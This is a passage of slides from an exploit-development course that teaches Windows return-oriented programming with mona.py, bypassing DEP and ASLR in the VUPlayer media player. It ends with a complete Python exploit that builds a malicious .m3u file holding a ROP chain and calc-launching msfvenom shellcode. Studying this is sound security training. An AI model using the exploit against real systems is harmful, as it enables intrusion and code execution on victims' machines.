fragments contain gadgets that allow us to move ecx to 
ebp.
|  p.48
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Rop.txt contains an unsorted list of gadgets found within 
the executable. 
|  p.49
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
rop_chains.txt contains full ROP chains that mona was able 
to build. If you can see a complete chain built in here, you’re 
halfway to beating the DEP protection.
|  p.50
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Such chains often require some tweaking. This time, there’s 
at least one thing we could improve.
Although the VUPlayer.exe is a non-ASLR module, its 
addresses start with a null byte. Let’s repeat the search and 
include only the .DLL modules.
!mona rop -m BASSWMA.dll,BASSMIDI.dll,BASS.dll
|  p.51
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Looking into the rop_chains.txt file, there’s only one chain built 
successfully, the one that utilizes the VirtualProtect() function. 
If we take for example the VirtualAlloc() chain, we see that mona 
was unable to find some pointers. In such a case, manual work 
might help to get such a method to work.
|  p.52
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Back to the 
VirtualProtect() chain, 
the most important 
thing is the address of 
VirtualProtect. 
Even if we have to 
rebuild this chain, we 
will utilize this pointer.
|  p.53
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Unfortunately, this ROP chain cannot be pasted into the 
exploit and just be run. If you try this, you will end up in 
Access Violation. Instead of rebuilding it, let’s analyze what 
is needed to build a ROP chain and start to create it.
As on Linux ROP, all we want is to call a function with 
certain arguments. This function is VirtualProtect, and let’s 
see what arguments we have to use.
|  p.54
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Looking at Microsoft’s pages, VirtualProtect takes the
following arguments.
https://docs.microsoft.com/en-us/Windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
|  p.55
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
According to this, we must push four arguments onto the 
stack plus the return address before we call the function.
The return address can be the address of the shellcode, 
and the VirtualProtect’s lpAddress argument will point to 
the shellcode. In such a case, VirtualProtect will make the 
shellcode area executable and smoothly return to that 
shellcode after enabling it for execution.
|  p.56
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Dwsize specifies the number of bytes affected by the 
function. We will use a size of 0x201 bytes. flNewProtect
specifies the protection flag and we will use 0x40, which 
stands for PAGE_EXECUTE_READWRITE.
lpflOldProtect points to the variable that will be given the 
previous access protection value. This needs to be a valid 
pointer.
|  p.57
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
As all of these arguments need to be pushed onto the 
stack, we can do it in two ways. 
First, we can push them in some distance from the actual 
stack so that we are able to operate on values delivered in 
the exploit buffer and then, when the stack is set up, 
change the Stack Pointer.
|  p.58
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
However, there’s simpler method. 
We can use the PUSHAD instruction. PUSHAD pushes all 
general-purpose registers onto the stack at once, so if we 
will be able to store the subsequent arguments into the 
registers, we can then just use PUSHAD to move them to
the stack.
|  p.59
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
What we will try to achieve in the registers is:
• EAX will point to VirtualProtect.
• ECX will contain the address of a dummy writable 
location (lpflOldProtect).
• EDX will contain the protection level flag, so 0x40.
• EBX will contain the shellcode size; we chose 0x201.
• ESP will contain the stack pointer. Shellcode will be 
placed near the top of the stack, so that we may be able 
to reference it.
|  p.60
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
• EBP will contain the return address. An address of a 
gadget will be stored in it. It can be any gadget that will 
return execution back to stack, in the form of POP X, 
RET. This way, upon returning to that location, it will just 
return back to the stack.
All of these registers are presented in the order they will be 
pushed onto the stack. EDI and ESI will contain some 
instructions that will help us to execute the whole chain.
|  p.61
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
You’ve been studying quite 
intently. We recommend taking 
a quick break and come back 
refreshed. There are is more 
interesting content and labs up 
next! 
|  p.62
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
As we now have all the theoretical foundation to build the 
chain, let’s start the actual development. We will implement 
the ROP-function skeleton from rop_chains.txt into our 
exploit.
We will also change the JMP ESP instruction to RET, so we 
start to take addresses from the stack and execute 
whatever they point to, instead of executing instructions on 
the stack which is forbidden by DEP.
|  p.63
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
In order to obtain the address of the plain „RET” instruction, 
we can go to any gadget address in Immunity using the 
black arrow button which, stands for „Expression to follow”. 
Gadgets can be found in the rop.txt file.
We insert the address of the gadget there and now just the 
address of RET can be copied and used in the exploit. 
|  p.64
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
The depicted address was found using the steps described 
in previous slide. We followed the „POP EBP” expression 
which is at 0x10010157. In the result we see the gadget at 
that address. As we need just the RET, we’ll use 
0x10010158, which is the address of it.
|  p.65
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Let’s run the application in the debugger, and using the 
aforementioned functionality, place a breakpoint (F2) on 
the location 0x10010158.
|  p.66
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
We will now launch
the updated payload. 
Currently, the exploit 
looks like the 
following, and we will 
run it now just for 
clarity.
|  p.67
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
As we stop in the breakpoint at the RET instruction, we can 
observe the stack.
The top of the stack contains the ROP chain placeholder.
|  p.68
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
If we now „Step Into”, EIP becomes 0x42424242  (so the 
value that was stored on the top of the stack). If this was an 
address of other instructions that are not on the stack, we 
would start to execute them.
|  p.69
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Using the pointer to the pure „RET” instruction to overwrite the 
EIP, we can start to execute addresses that are residing on the 
stack. Let’s start creating the ROP chain this way. We will start 
from the last value to be pushed, the Return address that is in the
EBP. As previously mentioned, this can be the address of any 
instruction of the format POP X, RET.
We also need to store that adress in EBP. So, the simplest way to 
do so will be to place the address of POP EBP, RET on the stack 
twice. This might be confusing. We will store the address of POP 
EBP, RET in EBP. To do so, we will execute another POP EBP, 
RET.
|  p.70
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
In rop.txt, we look for instructions POP EBP # RETN. It is 
important to pick an address without null bytes and a clear retn, 
not „RETN X”. In case of RETN X, a certain amount of bytes would 
need to be added to the stack to pad the X value. 
For example, RET 8 will remove the additional 8 bytes from the 
stack, so in the case of using such an instruction we would need 
to add an additional placeholder of 8 bytes to the exploit buffer 
before the next address we would like to return to.
|  p.71
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
We pick an address with a clear retn, and add it to the 
exploit. We will then add it twice to the exploit buffer. The 
instruction is found at 0x100106e1.
|  p.72
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
The only thing that is currently modified in the exploit is the 
ROP chain. We will also place a breakpoint again in the first 
ret – at 0x10010158.
|  p.73
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
The breakpoint is placed and we open the exploit playlist. It 
might be required to re-set it upon each restart of the 
debugged application.
|  p.74
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Upon hitting the breakpoint at RET, we see those two POP 
EBP, RET addresses placed on the stack.
|  p.75
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
As we step into one instruction, we are now at „POP EBP”. 
This is the first address in the ROP chain that execution 
was redirected into. The second copy of that address is still 
on the stack.
|  p.76
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
As we step into it once again, the address from the stack is 
popped into EBP.
|  p.77
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
EBP now contains a pointer to POP EBP, RET, which will be 
used later as the return address.
Currently we have „RET” to be executed, and on the stack 
there is just our placeholder 0x42424242, moving forward 
will lead us to an access violation. However, we just 
executed a micro ROP chain. Let’s go back to the exploit 
and start to work on more arguments to VirtualProtect.
|  p.78
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
The next argument we would like to setup before the call to 
PUSHAD, will be dwSize, which will reside in EBX.
Unfortunately, due to null bytes, we cannot simply push 
0x201.
However, we can use negation. We can push the fixed 
0xfffffdff value, and then find a gadget that does negate 
the operation. You can also consider other operations, like 
POP REG [value] # ADD REG or similar.
|  p.79
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Consider the following gadgets in the chain:
• 0x10015f82   - POP EAX # RETN
• 0xfffffdff - After negation, will become 0x201
• 0x10014db4 - NEG EAX # RETN
• 0x10032f72 - XCHG EAX, EBX
|  p.80
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Let’s place them in the exploit and start with the breakpoint 
in the first RET as usual. We will again step into each 
instruction and see what they do.
|  p.81
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
We run the exploit and stop at the first RET breakpoint.
The stack contains the whole ROP chain:
|  p.82
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
We now step into three times, until 0x100106E1 is popped 
into EBP (that was done in the previous step). We are now 
at the POP EAX gadget’s first instruction.
|  p.83
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
We can see that the value to negate is now on the top of 
the stack, so the upcoming POP EAX operation will place it 
in EAX. Let’s step into once to see it being popped to EAX.
The address of another gadget (NEG EAX # RET) is now on 
the top of the stack. As we step into the current RET, we 
will start to execute it.
|  p.84
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Once we step into further, the EAX will be negated, resulting 
in 0x201. 
|  p.85
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Finally, stepping into the last two times makes the EAX 
content to be exchanged with EBX, and then, upon the next 
step into, the control flow returns to another address on the 
stack which is the placeholder.
|  p.86
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
You should now begin to understand how ROP works on 
Windows. Let’s continue implementing the set up of the 
remaining arguments onto the stack.
The next argument will be flNewProtect, which also 
contains null bytes (0x40) so it will be stored in EDX in a 
very similar way.
|  p.87
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
We will use the following gadgets:
• 0x10015f82 – POP EAX # RETN
• 0xffffffc0 – This value will be negated, resulting in 0x40.
• 0x10014db4 – NEG EAX # RETN
• 0x10038a6d – XCHG EAX, EDX # RETN
|  p.88
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Let’s place the breakpoint at the first RET, as usual, and 
step into through the current ROP chain. At its end we can 
see that in addition to the previously set registers, EDX now 
contains the value 0x40.
|  p.89
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
After the last instruction in the chain, XCHG EAX, EDX, let’s
take a look at the registers and proceed to crafting the
remaining arguments.
|  p.90
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
We would like to store a pointer to any writable location into ECX, 
so it will become the lpflOldProtect value. As said previously, this
can be any valid address within the application address space, 
and it has to be mapped with „Write” permission. Note that a non-
aslr module address is required. We choose a random location –
0x101082cc. Using the memory map, you can make sure that the 
location of choice has Write permissions. So, the next gadgets 
will be POP ECX, and the address to a writable location. 
Let’s add it to our buffer.
|  p.91
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
As a reminder, like other instructions, POP ECX can be 
found again in rop.txt. We choose 0x106053e5.
|  p.92
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Let’s update the exploit accordingly.
|  p.93
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
As we step into the updated ROP chain, we can see that the 
value is also being stored in the register.
|  p.94
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
As we would like to call VirtualProtect later, let’s set up EDI 
and ESI with instructions that will return to the stack and 
then call EAX. 
The pointer to VirtualProtect will be later stored in EAX.
|  p.95
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
The following instructions will be added:
• 0x1001621c,  # POP EDI # RETN 
• 0x10010158,  # RETN  - will be stored in EDI 
• 0x10604154,  # POP ESI # RETN 
• 0x10101c02,  # JMP [EAX] 
|  p.96
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Let’s update the exploit and debug the chain.
|  p.97
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Using the first gadget, we place the address of the RET 
instruction in EDI.
|  p.98
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
The second gadget will place the address of JMP [EAX] in 
ESI. Its purpose will be clearer as soon as the chain is 
complete (we are close to it).
|  p.99
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
ESI can be viewed in the disassembly.
|  p.100
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
At the end of the function call setup, we will place a pointer 
to VirtualProtect in EAX. Since we are dealing with ASLR, 
we cannot hardcode it. However, such pointers can be 
retrieved from the process internal structures, like IAT 
(Import Address Table). Mona can find the gadget for 
retrieving such an address.
|  p.101
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
If we take a look into the rop_chains.txt, we can copy two 
gadgets that were generated by mona.
|  p.102
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Let’s update the
exploit, but we will 
not run it yet.
Since we are close 
to finishing, let’s add 
two last 
instructions.
|  p.103
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
We will add the PUSHAD instruction. Also, we will need 
JMP ESP right after it, as after the VirtualProtect call the 
0x201 bytes of the stack should become executable and we 
will want to jump to that area.
To conclude, we add the following gadgets:
• 0x1001d7a5 – PUSHAD, RET
• 0x10022aa7 – Address of JMP ESP
|  p.104
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
The exploit is 
updated, and the 
placeholder is 
removed as the 
chain is complete.
|  p.105
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Right after pushad, we see the stack is set up for the 
VirtualProtect call.
|  p.106
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Let’s place the breakpoint, as usual, in the first RET, and 
then use STEP OVER (F8) to walk through it. 
We do so to avoid landing in deep system functions’ 
internals.
|  p.107
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
We stop right after PUSHAD. You can see all the arguments 
are pushed onto the stack.
|  p.108
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Next, we land in the the standalone „RET” instruction we pushed into
the EDI. This allows us to simply use it as a NOP to reach another 
instruction. 
This register is not used as any function argument, but after the
PUSHAD instruction it will be pushed onto the stack. If any gadget 
restores execution to that place, if there is a RETN instruction, the 
execution will continue. 
|  p.109
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
As we Step Over once again, we land in JMP [EAX]. EAX 
contains the pointer to VirtualProtect, so we are one step 
before executing VirtualProtect.
|  p.110
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
You can see the arguments to VirtualProtect on the stack. 
There is the Return address 100106E1, which is the call to 
POP EBP, followed by the function arguments: lpAddress, 
dwSize, flNewProtect and lpflOldProtect.
|  p.111
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
As we now Step Over until we are at the end of 
VirtualProtect, VirtualProtect gets executed with our 
arguments and we land in the return address – POP EBP.
|  p.112
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
As we step over the POP EBP, the address to VirtualProtect 
(not needed anymore) is popped off the stack. Then, we 
step over the RETN and we end up taking the last address 
of the ROP chain into the EIP. It is the JMP ESP instruction, 
which will transfer the execution flow to the stack.
|  p.113
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
As we now step over, we can see that there is no more 
access violation. We can execute data on the stack.
|  p.114
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Let’s generate the msfvenom calc shellcode and place it 
into the exploit. We will skip bad character detection this 
time (we would like to stay away from 0x00 and CRLF’s, 
also, 0x1a turned out to be a bad character as well).
|  p.115
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
And the updated exploit 
works!
Here, we tried it against 
the software outside of
the debugger.
|  p.116
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Here is the full exploit 
code (split into two 
parts):
import struct
def create_rop_chain():
rop_gadgets = [
0x100106e1,  # Pop EBP, RET
0x100106e1,  # This address wil be popped to EBP, and this is address of pop EBP, RET
0x10015f82,  # POP EAX # RETN
0xfffffdff,  # VALUE TO NEGATE
0x10014db4,  # NEG EAX # RETN
0x10032f72,  # XCHG EAX, EBX - another argument is set up in ebx now
0x10015f82,  # POP EAX # RETN
0xffffffc0,  # This value will be negated resulting in 0x40
0x10014db4,  # NEG EAX # RETN
0x10038a6d,  # XCHG EAX, EDX # RETN
0x106053e5,  # POP ECX, RETN
0x101082cc,  # Writable location address that will be popped into ECX
0x1001621c,  # POP EDI # RETN 
0x10010158,  # RETN  - will be stored in EDI
0x10604154,  # POP ESI # RETN 
0x10101c02,  # JMP [EAX] 
0x10015fe7,  # POP EAX # RETN [BASS.dll] 
0x10109270,  # ptr to &VirtualProtect() [IAT BASSWMA.dll]
0x1001d7a5,  # PUSHAD # RETN
0x10022aa7  # Address of JMP ESP
]
return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
|  p.117
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
ret = struct.pack("<I", 0x10010158)
rop_chain = create_rop_chain()
shellcode = "\x90"*32 
# msfvenom -p Windows/exec cmd=calc.exe -b "\x00\x0a\x0d\x1a" -f c
buf = ("\xba\x06\xfd\x75\xdb\xdb\xd8\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x31\x31\x50\x13\x83\xc0\x04\x03\x50\x09\x1f\x80\x27\xfd\x5d"
"\x6b\xd8\xfd\x01\xe5\x3d\xcc\x01\x91\x36\x7e\xb2\xd1\x1b\x72"
"\x39\xb7\x8f\x01\x4f\x10\xbf\xa2\xfa\x46\x8e\x33\x56\xba\x91"
"\xb7\xa5\xef\x71\x86\x65\xe2\x70\xcf\x98\x0f\x20\x98\xd7\xa2"
"\xd5\xad\xa2\x7e\x5d\xfd\x23\x07\x82\xb5\x42\x26\x15\xce\x1c"
"\xe8\x97\x03\x15\xa1\x8f\x40\x10\x7b\x3b\xb2\xee\x7a\xed\x8b"
"\x0f\xd0\xd0\x24\xe2\x28\x14\x82\x1d\x5f\x6c\xf1\xa0\x58\xab"
"\x88\x7e\xec\x28\x2a\xf4\x56\x95\xcb\xd9\x01\x5e\xc7\x96\x46"
"\x38\xcb\x29\x8a\x32\xf7\xa2\x2d\x95\x7e\xf0\x09\x31\xdb\xa2"
"\x30\x60\x81\x05\x4c\x72\x6a\xf9\xe8\xf8\x86\xee\x80\xa2\xcc"
"\xf1\x17\xd9\xa2\xf2\x27\xe2\x92\x9a\x16\x69\x7d\xdc\xa6\xb8"
"\x3a\x12\xed\xe1\x6a\xbb\xa8\x73\x2f\xa6\x4a\xae\x73\xdf\xc8"
"\x5b\x0b\x24\xd0\x29\x0e\x60\x56\xc1\x62\xf9\x33\xe5\xd1\xfa"
"\x11\x86\xb4\x68\xf9\x67\x53\x09\x98\x77")
shellcode += buf
buffer = "A"*1012
buffer += ret #we move execution to the stack where chain of ROPs reside
buffer += rop_chain #set of instructions that will call VirtualProtect and return to the stack
buffer += shellcode #some NOPs for increased accuracy and then the shellcode
buffer += "\x90"*(2500-len(buffer)) #filler
file = open('exploit.m3u','w');
file.write(buffer);
file.close();
print "[+] Created .m3u file. \n"
|  p.118
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
In this walkthrough, we showed how DEP + ASLR can be 
bypassed at once on Windows 7 32-bit.
As an addition to the ASLR bypass, you might like another 
tool that was not used in the exploit but is worth your 
attention as an aspiring exploit developer.
|  p.119
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
There is an interesting project called pefinder that localizes 
system-existing non-ASLR binaries. It is a small executable 
that takes a path to file as an argument and prints which 
countermeasures are supported by that file.
The older the system, the more default non-ASLR modules 
can be found on it. Also, there are many common software 
components included by applications that do not support 
ASLR. For example, old .NET and Java default DLL’s do not 
support ASLR.
|  p.120
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
You can find the description and the download link of 
pefinder here.
https://www.scriptjunkie.us/2011/03/finding-non-aslr-or-dep-modules/
|  p.121
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
*Labs are only available in Full or Elite Editions of the course. To access, go to the course in your members area and 
click the labs drop-down in the appropriate module line or to the virtual labs tabs on the left navigation. To 
upgrade, click LINK. 
In this lab, you will be shown 
how Return Oriented 
Programming can be used on 
Windows systems during 
exploit development to bypass 
anti-exploit mechanisms.
Windows ROP 
(Scenario 1)
|  p.122
Hera Lab #1
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
*Labs are only available in Full or Elite Editions of the course. To access, go to the course in your members area and 
click the labs drop-down in the appropriate module line or to the virtual labs tabs on the left navigation. To 
upgrade, click LINK. 
During this lab, you will 
practice Return Oriented 
Programming on Windows 
and how it can be used to 
bypass anti-exploit 
mechanisms.
Windows ROP 
(Scenario 2)
|  p.123
Hera Lab #2
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
References
|  p.124
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
References
WinExec function
VirtualAlloc function
VirtualProtect function
WriteProcessMemory function
https://docs.microsoft.com/en-us/Windows/win32/api/winbase/nf-winbase-winexec
https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-
virtualprotect
https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-
writeprocessmemory
|  p.125
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
References
HeapCreate function
SetProcessDEPPolicy function
The Undocumented Functions - Microsoft Windows NT/2000/XP/Win7
Finding non-ASLR or DEP modules
https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapcreate
https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-
setprocessdeppolicy
https://undocumented.ntinternals.net/
https://www.scriptjunkie.us/2011/03/finding-non-aslr-or-dep-modules/
|  p.126
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Labs
*Labs are only available in Full or Elite Editions of the course. To access, go to the course in your 
members area and click the labs drop-down in the appropriate module line or to the virtual labs 
tabs on the left navigation. To upgrade, click LINK. 
Windows ROP (Scenario 1)
In this lab, you will be shown how Return Oriented Programming can 
be used on Windows systems during exploit development to bypass 
anti-exploit mechanisms.
Windows ROP (Scenario 2)
During this lab, you will practice Return Oriented Programming on 
Windows and how it can be used to bypass anti-exploit mechanisms.
|  p.127
